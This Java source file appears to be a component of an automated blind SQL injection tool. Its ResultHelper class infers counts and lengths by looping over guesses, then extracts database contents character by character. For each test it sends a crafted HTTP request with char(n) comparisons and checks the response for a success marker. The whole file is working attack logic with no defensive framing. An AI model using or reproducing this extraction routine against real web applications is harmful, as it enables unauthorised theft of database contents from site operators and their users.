/**
 * @ ResultHelper.java
 */
package logic.result;

import logic.domain.HttpBullet;
import logic.domain.QueryCondition;
import logic.domain.URLCondition;
import logic.domain.UserValueCondition;
import logic.http.HttpBulletFactory;
import logic.http.HttpSoldier;

/**
 * <pre>
 * logic.result
 * ResultHelper.java 
 * </pre>
 *
 * @brief	: 
 * @author	: Jae-Woong Moon(mjw8585@gmail.com)
 * @Date	: 2017/08/17
 */
public class ResultHelper {

	private SuccessDecider decider = null;
	private HttpSoldier httpSoldier = null;
	private HttpBulletFactory factory = null;
	
	public ResultHelper() {
		decider = new SuccessDecider();
		httpSoldier = new HttpSoldier();
		factory = new HttpBulletFactory();
	}

	public int getCount(QueryCondition qc, URLCondition uc, UserValueCondition cond){
		return cntWork(qc, uc, cond.getCountUntil(), cond.getMatch());
	}
	
	public int getLength(QueryCondition qc, URLCondition uc, UserValueCondition cond){
		return cntWork(qc, uc, cond.getLengthUntil(), cond.getMatch());
	}
	
	private int cntWork(QueryCondition qc, URLCondition uc, int until, String match){
		int cnt = 0;
		for(int i=0; i < until; i++){
			qc.setCheckVal(i+"");
			HttpBullet bullet = factory.getHttpBullet(qc, uc);
			//System.out.println(bullet.getUrl());
			String res = httpSoldier.send(bullet);
			//System.out.println(res);
			if(decider.isSuccess(res, match)){
				cnt = i;
				break;
			}
		}
		return cnt;
	}
	
	public String getContent(QueryCondition qc, URLCondition uc, UserValueCondition cond, int targetContentLength){
		String content = "";
		for(int i=0; i < targetContentLength ; i++){
			for(int j=33; j < 127; j++){ //(search ascii 33~126)
				qc.setDbNameIndex(i+1);  //이 것을 테이블이나 칼럼일 경우 어떻게 할 것인지...
				qc.setCheckVal("char("+j+")");
				HttpBullet bullet = factory.getHttpBullet(qc, uc);
				String res = httpSoldier.send(bullet);
				
				if(decider.isSuccess(res, cond.getMatch())){
					//System.out.println("find !! at : " + j);
					String ascii = Character.toString((char)j);
					content += ascii;
					break;
				}
			}
		}
		return content;
	}
}
